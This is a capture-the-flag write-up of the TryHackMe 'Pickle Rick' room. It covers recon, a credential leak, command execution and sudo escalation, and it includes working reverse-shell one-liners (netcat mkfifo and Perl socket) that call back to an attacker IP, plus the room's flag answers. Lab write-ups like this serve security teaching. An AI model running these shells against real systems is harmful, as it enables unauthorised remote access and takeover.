Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “**Pickle Rick**.”

This room was a very fun room and I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image2]

First, we deploy the machine. While it’s booting up, go ahead and open your terminal tab and get it ready.

![][image3]

We Start with an **Nmap** scan to check open ports:

![][image4]

***nmap 10.10.137.72 — open***

Then I Run **Feroxbuster** to find hidden directories:

![][image5]

***feroxbuster \-u http://10.10.137.72 \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt***

Then to the webpage:

![][image6]

From the Feroxbuster scan, I see there is a login.php page but I have no credentials, apart from this there is even **/assets** and **robots.txt**

I then inspect the page and see a username

![][image7]

On checking robots.txt, I find a **password-like** string

![][image8]

And, inspecting the page at portals.php I see this :

![][image9]

Then I head over to **login.php** and try using the found credentials

![][image10]

Once I’m Successfully logged in, I look through but there are **no direct options** to retrieve a flag

![][image11]

Then I Inspect the page source → **Base64 encoded text found**

Decoding the Base64 → **No useful information**

Then I see there is a **Command Execution Panel** that allows us to run system commands.

![][image12]

Testing simple Linux commands like ls, pwd, and whoami **works**, meaning **Remote Code Execution (RCE) is possible**

This is the key, and I suggest that all of you refer to this repo: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

So I set up a **Reverse Shell:**

*rm \-f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh \-i 2\>&1 | nc 10.4.1.240 1234 \>/tmp/f*

***{Replace 10.4.1.240 with your system IP, and 1234 with your listening port}***

Back to the terminal, open a Netcat listener in another tab:

***nc \-lvnp 1234***

That did not work so I changed the rev shell and used this :

***perl \-e ‘use Socket;$i=”10.4.1.240";$p=1234;***  
***socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(“tcp”));***  
***if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,”\>\&S”);***  
***open(STDOUT,”\>\&S”);open(STDERR,”\>\&S”);exec(“/bin/sh \-i”);};’***

Now when you execute this on the panel the listner catches it and we gain shell access .

![][image13]

Now that we are in:

![][image14]

***cat Sup3rS3cretPickl3Ingred.txt***

Find the **second ingredient** in the /home directory but it **doesn’t open**

Realize the filename has a **space**

***cat “second ingredients”***

Then Check **sudo permissions by:**

**![][image15]**

***sudo \-l***

It shows **ALL permissions**, meaning we can escalate easily

***sudo su***

Navigate to /root and get the final flag:

***cat 3rd.txt***

***![][image16]***

Flag 1: mr. meeseek hair

Flag 2: 1 jerry tear

Flag 3: fleeb juice
